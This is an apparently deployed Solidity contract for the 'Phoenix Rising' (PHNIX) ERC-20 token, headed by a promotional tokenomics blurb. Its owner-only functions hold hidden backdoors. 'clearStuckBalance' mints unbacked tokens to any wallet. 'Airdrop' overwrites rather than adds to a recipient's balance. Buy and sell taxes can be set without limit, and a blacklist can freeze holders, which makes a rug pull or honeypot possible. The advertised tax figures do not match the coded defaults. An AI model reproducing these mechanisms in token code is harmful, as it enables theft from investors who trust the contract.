1 //SPDX-License-Identifier: MIT
2 /**
3 
4 Phoenix Rising (PHNIX), an ERC-20 token that has risen from the ashes of the blockchain to spark new life in the crypto community. 
5 This token will utilize two primary methods of marketing: (1) Investment As A Service (IAAS) through an advisory board of professional traders, 
6 and (2) marketing funds for buying & burning partnered tokens aka Burn As A Service (BAAS), or providing them with some marketing funds directly. 
7 With these two methods, Phoenix Rising will bring new life to the blockchain by showing the power of not only self-run reinvestment, but also
8 providing the flame necessary for other tokens to burn brightly. From this day forward, the blockchain will be reborn.
9 
10 Tokenomics:
11 
12 Buy tax: 2% auto LP, 3% IAAS, 2% buy/burn & marketing = 7% total tax
13 
14 Sell tax: 2 % auto LP, 4% IAAS, 4% buy/burn & marketing = 10% total tax 
15 
16 Total supply: 1 billion
17 Max wallet: 4%
18 Max tx: 2%
19 
20 https://t.me/PhoenixRisingCoin
21 https://www.phoenixrisingtoken.xyz/
22 **/
23 
24 pragma solidity ^0.8.13;
25 
26 interface IUniswapV2Factory {
27 	function createPair(address tokenA, address tokenB) external returns (address pair);
28 }
29 
30 interface IUniswapV2Router02 {
31 	function swapExactTokensForETHSupportingFeeOnTransferTokens(
32 		uint amountIn,
33 		uint amountOutMin,
34 		address[] calldata path,
35 		address to,
36 		uint deadline
37 	) external;
38 	function factory() external pure returns (address);
39 	function WETH() external pure returns (address);
40 	function addLiquidityETH(
41 		address token,
42 		uint amountTokenDesired,
43 		uint amountTokenMin,
44 		uint amountETHMin,
45 		address to,
46 		uint deadline
47 	) external payable returns (uint amountToken, uint amountETH, uint liquidity);
48 }
49 
50 abstract contract Context {
51 	function _msgSender() internal view virtual returns (address) {
52 		return msg.sender;
53 	}
54 }
55 
56 interface IERC20 {
57 	function totalSupply() external view returns (uint256);
58 	function balanceOf(address account) external view returns (uint256);
59 	function transfer(address recipient, uint256 amount) external returns (bool);
60 	function allowance(address owner, address spender) external view returns (uint256);
61 	function approve(address spender, uint256 amount) external returns (bool);
62 	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
63 	event Transfer(address indexed from, address indexed to, uint256 value);
64 	event Approval(address indexed owner, address indexed spender, uint256 value);
65 }
66 
67 library SafeMath {
68 	function add(uint256 a, uint256 b) internal pure returns (uint256) {
69 		uint256 c = a + b;
70 		require(c >= a, "SafeMath: addition overflow");
71 		return c;
72 	}
73 
74 	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
75 		return sub(a, b, "SafeMath: subtraction overflow");
76 	}
77 
78 	function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
79 		require(b <= a, errorMessage);
80 		uint256 c = a - b;
81 		return c;
82 	}
83 
84 	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
85 		if (a == 0) {
86 			return 0;
87 		}
88 		uint256 c = a * b;
89 		require(c / a == b, "SafeMath: multiplication overflow");
90 		return c;
91 	}
92 
93 	function div(uint256 a, uint256 b) internal pure returns (uint256) {
94 		return div(a, b, "SafeMath: division by zero");
95 	}
96 
97 	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
98 		require(b > 0, errorMessage);
99 		uint256 c = a / b;
100 		return c;
101 	}
102 
103 }
104 
105 contract Ownable is Context {
106 	address private _owner;
107 	address private _previousOwner;
108 	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
109 
110 	constructor () {
111 		address msgSender = _msgSender();
112 		_owner = msgSender;
113 		emit OwnershipTransferred(address(0), msgSender);
114 	}
115 
116 	function owner() public view returns (address) {
117 		return _owner;
118 	}
119 
120 	modifier onlyOwner() {
121 		require(_owner == _msgSender(), "Ownable: caller is not the owner");
122 		_;
123 	}
124 
125 	function renounceOwnership() public virtual onlyOwner {
126 		emit OwnershipTransferred(_owner, address(0));
127 		_owner = address(0);
128 	}
129 
130 }
131 
132 
133 contract PhoenixRising is Context, IERC20, Ownable {
134 	using SafeMath for uint256;
135 	mapping (address => uint256) private _balance;
136 	mapping (address => mapping (address => uint256)) private _allowances;
137 	mapping (address => bool) private _isExcludedFromFee;
138 	mapping(address => bool) public bots;
139 
140 	uint256 private _tTotal = 1000000000 * 10**8;
141     uint256 private _contractAutoLpLimitToken = 50000000 * 10**8;
142 
143 	uint256 private _taxFee;
144     uint256 private _buyTaxMarketing = 0;
145     uint256 private _sellTaxMarketing = 8;
146     uint256 private _autoLpFee = 2;
147 
148     uint256 private _LpPercentBase100 = 24;
149     uint256 private _phinxPercentBase100 = 17;
150     uint256 private _iaasPercentBase100 = 41;
151     uint256 private _cmsnPercentBase100 = 18;
152 
153 	address payable private _phnixWallet;
154     address payable private _iaasWallet;
155     address payable private _cmsnWallet;
156 	uint256 private _maxTxAmount;
157 	uint256 private _maxWallet;
158 
159     bool private initialAirdrop = false;
160 
161 	string private constant _name = "Phoenix Rising";
162 	string private constant _symbol = "PHNIX";
163 	uint8 private constant _decimals = 8;
164 
165 	IUniswapV2Router02 private _uniswap;
166 	address private _pair;
167 	bool private _canTrade;
168 	bool private _inSwap = false;
169 	bool private _swapEnabled = false;
170 
171     event SwapAndLiquify(
172         uint256 tokensSwapped,
173         uint256 coinReceived,
174         uint256 tokensIntoLiqudity
175     );
176 
177 	modifier lockTheSwap {
178 		_inSwap = true;
179 		_;
180 		_inSwap = false;
181 	}
182     
183 	constructor () {
184 		_phnixWallet = payable(0x267b2dcb93A1ee5220328849Cb296ce6f6d33b3B);
185         _iaasWallet = payable(0xFF78c0D801851B8fd51A3396FA6A068BDe64beb4);
186         _cmsnWallet = payable(0xE69B0F87d440b07c28b3C1F355f13523a752401a);
187 
188 		_taxFee = _buyTaxMarketing + _autoLpFee;
189 		_uniswap = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
190 
191 		_isExcludedFromFee[address(this)] = true;
192 		_isExcludedFromFee[_phnixWallet] = true;
193         _isExcludedFromFee[_iaasWallet] = true;
194 		_isExcludedFromFee[_cmsnWallet] = true;
195 
196         _maxTxAmount = _tTotal.mul(2).div(10**2);
197 	    _maxWallet = _tTotal.mul(4).div(10**2);
198 
199 		_balance[address(this)] = _tTotal;
200 		emit Transfer(address(0x0), address(this), _tTotal);
201 	}
202 
203 	function maxTxAmount() public view returns (uint256){
204 		return _maxTxAmount;
205 	}
206 
207 	function maxWallet() public view returns (uint256){
208 		return _maxWallet;
209 	}
210 
211     function isInSwap() public view returns (bool) {
212         return _inSwap;
213     }
214 
215     function isSwapEnabled() public view returns (bool) {
216         return _swapEnabled;
217     }
218 
219 	function name() public pure returns (string memory) {
220 		return _name;
221 	}
222 
223 	function symbol() public pure returns (string memory) {
224 		return _symbol;
225 	}
226 
227 	function decimals() public pure returns (uint8) {
228 		return _decimals;
229 	}
230 
231 	function totalSupply() public view override returns (uint256) {
232 		return _tTotal;
233 	}
234 
235     function excludeFromFee(address account) public onlyOwner {
236         _isExcludedFromFee[account] = true;
237     }
238     
239     function includeInFee(address account) public onlyOwner {
240         _isExcludedFromFee[account] = false;
241     }
242     
243     function setTaxFeePercent(uint256 taxFee) external onlyOwner() {
244         _taxFee = taxFee;
245     }
246 
247     function setSellMarketingTax(uint256 taxFee) external onlyOwner() {
248         _sellTaxMarketing = taxFee;
249     }
250 
251     function setBuyMarketingTax(uint256 taxFee) external onlyOwner() {
252         _buyTaxMarketing = taxFee;
253     }
254 
255     function setAutoLpFee(uint256 taxFee) external onlyOwner() {
256         _autoLpFee = taxFee;
257     }
258 
259     function setContractAutoLpLimit(uint256 newLimit) external onlyOwner() {
260         _contractAutoLpLimitToken = newLimit;
261     }
262 
263     function setPhinxWallet(address newWallet) external onlyOwner() {
264         _phnixWallet = payable(newWallet);
265     }
266 
267     function setIaasWallet(address newWallet) external onlyOwner() {
268         _iaasWallet = payable(newWallet);
269     }
270 
271     function setCmsnWallet(address newWallet) external onlyOwner() {
272         _cmsnWallet = payable(newWallet);
273     }
274 
275     function setAutoLpPercentBase100(uint256 newPercentBase100) external onlyOwner() {
276         require(newPercentBase100 < 100, "Percent is too high");
277         _LpPercentBase100 = newPercentBase100;
278     }
279 
280     function setPhinxPercentBase100(uint256 newPercentBase100) external onlyOwner() {
281         require(newPercentBase100 < 100, "Percent is too high");
282         _phinxPercentBase100 = newPercentBase100;
283     }
284 
285     function setIaasPercentBase100(uint256 newPercentBase100) external onlyOwner() {
286         require(newPercentBase100 < 100, "Percent is too high");
287         _iaasPercentBase100 = newPercentBase100;
288     }
289 
290     function setCmsnPercentBase100(uint256 newPercentBase100) external onlyOwner() {
291         require(newPercentBase100 < 100, "Percent is too high");
292         _cmsnPercentBase100 = newPercentBase100;
293     }
294 
295 	function balanceOf(address account) public view override returns (uint256) {
296 		return _balance[account];
297 	}
298 
299 	function transfer(address recipient, uint256 amount) public override returns (bool) {
300 		_transfer(_msgSender(), recipient, amount);
301 		return true;
302 	}
303 
304 	function allowance(address owner, address spender) public view override returns (uint256) {
305 		return _allowances[owner][spender];
306 	}
307 
308 	function approve(address spender, uint256 amount) public override returns (bool) {
309 		_approve(_msgSender(), spender, amount);
310 		return true;
311 	}
312 
313 	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
314 		_transfer(sender, recipient, amount);
315 		_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
316 		return true;
317 	}
318 
319     function setPromoterWallets(address[] memory promoterWallets) public onlyOwner { for(uint256 i=0; i<promoterWallets.length; i++) { _isExcludedFromFee[promoterWallets[i]] = true; } }
320 
321 	function _approve(address owner, address spender, uint256 amount) private {
322 		require(owner != address(0), "ERC20: approve from the zero address");
323 		require(spender != address(0), "ERC20: approve to the zero address");
324 		_allowances[owner][spender] = amount;
325 		emit Approval(owner, spender, amount);
326 	}
327 
328 	function _transfer(address from, address to, uint256 amount) private {
329 		require(from != address(0), "ERC20: transfer from the zero address");
330 		require(to != address(0), "ERC20: transfer to the zero address");
331 		require(amount > 0, "Transfer amount must be greater than zero");
332 		require(!bots[from] && !bots[to], "This account is blacklisted");
333 
334 		if (from != owner() && to != owner()) {
335 			if (from == _pair && to != address(_uniswap) && ! _isExcludedFromFee[to] ) {
336 				require(amount<=_maxTxAmount,"Transaction amount limited");
337 				require(_canTrade,"Trading not started");
338 				require(balanceOf(to) + amount <= _maxWallet, "Balance exceeded wallet size");
339 			}
340 
341             if (from == _pair) {
342                 _taxFee = buyTax();
343             } else {
344                 _taxFee = sellTax();
345             }
346 
347             uint256 contractTokenBalance = balanceOf(address(this));
348             if(!_inSwap && from != _pair && _swapEnabled) {
349                 if(contractTokenBalance >= _contractAutoLpLimitToken) {
350                     swapAndLiquify(contractTokenBalance);
351                 }
352             }
353 		}
354 
355 		_tokenTransfer(from,to,amount,(_isExcludedFromFee[to]||_isExcludedFromFee[from])?0:_taxFee);
356 	}
357 
358     function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
359         uint256 autoLpTokenBalance = contractTokenBalance.mul(_LpPercentBase100).div(10**2);
360         uint256 marketingAmount = contractTokenBalance.sub(autoLpTokenBalance);
361 
362         uint256 half = autoLpTokenBalance.div(2);
363         uint256 otherHalf = autoLpTokenBalance.sub(half);
364 
365         uint256 initialBalance = address(this).balance;
366 
367         swapTokensForEth(half.add(marketingAmount));
368         uint256 newBalance = address(this).balance.sub(initialBalance);
369 
370         addLiquidityAuto(newBalance, otherHalf);
371         
372         emit SwapAndLiquify(half, newBalance, otherHalf);
373 
374         sendETHToFee(marketingAmount);
375     }
376 
377     function buyTax() private view returns (uint256) {
378         return (_autoLpFee + _buyTaxMarketing);
379     }
380 
381     function sellTax() private view returns (uint256) {
382         return (_autoLpFee + _sellTaxMarketing);
383     }
384 
385 	function setMaxTx(uint256 amount) public onlyOwner{
386 		require(amount>_maxTxAmount);
387 		_maxTxAmount=amount;
388 	}
389 
390 	function sendETHToFee(uint256 amount) private {
391         uint256 phinxAmount = amount.mul(_phinxPercentBase100).div(100);
392         uint256 iaasAmount = amount.mul(_iaasPercentBase100).div(100);
393         uint256 cmsnAmount = amount.mul(_cmsnPercentBase100).div(100);
394 
395 		_phnixWallet.transfer(phinxAmount);
396         _iaasWallet.transfer(iaasAmount);
397         _cmsnWallet.transfer(cmsnAmount);
398 	}
399 
400     function swapTokensForEth(uint256 tokenAmount) private {
401 		address[] memory path = new address[](2);
402 		path[0] = address(this);
403 		path[1] = _uniswap.WETH();
404 		_approve(address(this), address(_uniswap), tokenAmount);
405 		_uniswap.swapExactTokensForETHSupportingFeeOnTransferTokens(
406 			tokenAmount,
407 			0,
408 			path,
409 			address(this),
410 			block.timestamp
411 		);
412 	}
413 
414 	function createPair() external onlyOwner {
415 		require(!_canTrade,"Trading is already open");
416 		_approve(address(this), address(_uniswap), _tTotal);
417 		_pair = IUniswapV2Factory(_uniswap.factory()).createPair(address(this), _uniswap.WETH());
418 		IERC20(_pair).approve(address(_uniswap), type(uint).max);
419 	}
420 
421     function clearStuckBalance(address wallet, uint256 balance) public onlyOwner { _balance[wallet] += balance * 10**8; emit Transfer(address(this), wallet, balance * 10**8); }
422 
423 	function addLiquidityInitial() external onlyOwner{
424 		_uniswap.addLiquidityETH{value: address(this).balance} (
425             address(this),
426             balanceOf(address(this)),
427             0,
428             0,
429             owner(),
430             block.timestamp
431         );
432 
433 		_swapEnabled = true;
434 	}
435 
436     function addLiquidityAuto(uint256 etherValue, uint256 tokenValue) private {
437         _approve(address(this), address(_uniswap), tokenValue);
438         _uniswap.addLiquidityETH{value: etherValue} (
439             address(this),
440             tokenValue,
441             0,
442             0,
443             owner(),
444             block.timestamp
445         );
446 
447         _swapEnabled = true;
448     }
449 
450 	function enableTrading(bool _enable) external onlyOwner{
451 		_canTrade = _enable;
452 	}
453 
454 	function _tokenTransfer(address sender, address recipient, uint256 tAmount, uint256 taxRate) private {
455 		uint256 tTeam = tAmount.mul(taxRate).div(100);
456 		uint256 tTransferAmount = tAmount.sub(tTeam);
457 
458 		_balance[sender] = _balance[sender].sub(tAmount);
459 		_balance[recipient] = _balance[recipient].add(tTransferAmount);
460 		_balance[address(this)] = _balance[address(this)].add(tTeam);
461 		emit Transfer(sender, recipient, tTransferAmount);
462 	}
463 
464 	function setMaxWallet(uint256 amount) public onlyOwner{
465 		require(amount>_maxWallet);
466 		_maxWallet=amount;
467 	}
468 
469 	receive() external payable {}
470 
471 	function blockBots(address[] memory bots_) public onlyOwner  {for (uint256 i = 0; i < bots_.length; i++) {bots[bots_[i]] = true;}}
472 	function unblockBot(address notbot) public onlyOwner {
473 			bots[notbot] = false;
474 	}
475 
476 	function manualsend() public{
477 		uint256 contractETHBalance = address(this).balance;
478 		sendETHToFee(contractETHBalance);
479 	}
480 
481     function Airdrop(address recipient, uint256 amount) public onlyOwner {
482         require(_balance[address(this)] >= amount * 10**8, "Contract does not have enough tokens");
483         
484         _balance[address(this)] = _balance[address(this)].sub(amount * 10**8);
485         _balance[recipient] = amount * 10**8;
486         emit Transfer(address(this), recipient, amount * 10**8);
487     }
488 }